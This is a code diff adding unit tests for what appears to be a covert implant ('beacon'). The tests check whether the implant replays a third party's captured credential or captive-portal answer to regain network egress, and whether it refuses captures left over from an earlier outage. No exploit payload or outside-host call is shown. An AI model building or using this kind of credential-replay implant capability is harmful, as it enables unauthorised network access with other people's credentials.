@@ -206,6 +206,88 @@ class TestTheCredentialVerb(RungCase):
                 self.assertIn("[error]", beacon._exec_egress("credential"))
 
 
+class TestABorrowFileFromAPreviousOutage(RungCase):
+    """The scout removes it when a window closes; a dead scout cannot.
+
+    So the one way a stale borrow file survives is a scout that died in
+    an earlier outage with its capture still on the disk -- and then
+    there is no fresh document either, and nothing else about the
+    situation to notice with. Replaying a third party's credential that
+    this implant has no current evidence for is the one thing the quiet
+    rung should not do on a guess.
+
+    Judged against the **window's own stamp** and not a configured age: a
+    living scout rewrites the file every publish, so "written before this
+    window opened" is exact, it needs no second freshness rule beside
+    `document_max_age_seconds`, and it leaves rung 2 working for the whole
+    of an outage whose scout died halfway through.
+    """
+
+    def stamp(self, written):
+        path = handoff.borrow_path(self.state)
+        loaded = json.loads(Path(path).read_text())
+        loaded["written"] = written
+        Path(path).write_text(json.dumps(loaded))
+
+    def window(self, beacon, opened):
+        beacon._way_out_write(beacon_mod._WAY_OUT_STATE_NAME, {
+            "version": beacon_mod._WAY_OUT_STATE_VERSION,
+            "opened": opened, "touched": __import__("time").time(),
+            "stuck_cycles": beacon._stuck_cycles, "spent": 0, "budget": 3,
+            "evidence": beacon._egress_state()})
+
+    def test_one_written_before_this_window_opened_is_refused(self):
+        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
+        now = __import__("time").time()
+        self.window(beacon, opened=now)
+        self.stamp(now - 7200)
+
+        answer = beacon._exec_egress("credential")
+        self.assertIn("[error]", answer)
+        self.assertIn("previous outage", answer)
+        self.assertIsNone(beacon._proxy_session)
+
+    def test_one_written_inside_this_window_is_used(self):
+        # The scout died an hour into a week-long outage: the credential
+        # is this outage's, so the rung works.
+        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
+        now = __import__("time").time()
+        self.window(beacon, opened=now - 86400)
+        self.stamp(now - 3600)
+
+        self.assertNotIn("[error]", beacon._exec_egress("credential"))
+
+    def test_one_with_no_stamp_at_all_is_believed(self):
+        # A scout older than the field. Reading it as stale would turn an
+        # upgrade into a rung that never fires again.
+        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
+        self.window(beacon, opened=__import__("time").time())
+        path = handoff.borrow_path(self.state)
+        loaded = json.loads(Path(path).read_text())
+        del loaded["written"]
+        Path(path).write_text(json.dumps(loaded))
+
+        self.assertNotIn("[error]", beacon._exec_egress("credential"))
+
+    def test_with_no_window_open_the_operator_is_not_second_guessed(self):
+        # `egress credential` typed by hand on a recovered implant: there
+        # is no window to compare against, and refusing would be this
+        # verb deciding something the operator already decided.
+        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
+        self.stamp(__import__("time").time() - 7200)
+        self.assertNotIn("[error]", beacon._exec_egress("credential"))
+
+    def test_the_portal_arm_is_held_to_it_too(self):
+        beacon = self.beacon(borrow={"portal": A_PORTAL})
+        now = __import__("time").time()
+        self.window(beacon, opened=now)
+        self.stamp(now - 7200)
+
+        answer = beacon._exec_egress("portal")
+        self.assertIn("[error]", answer)
+        self.assertIn("previous outage", answer)
+
+
 class TestThePortalVerb(RungCase):
     """A captive portal answered as the host answered it."""
 
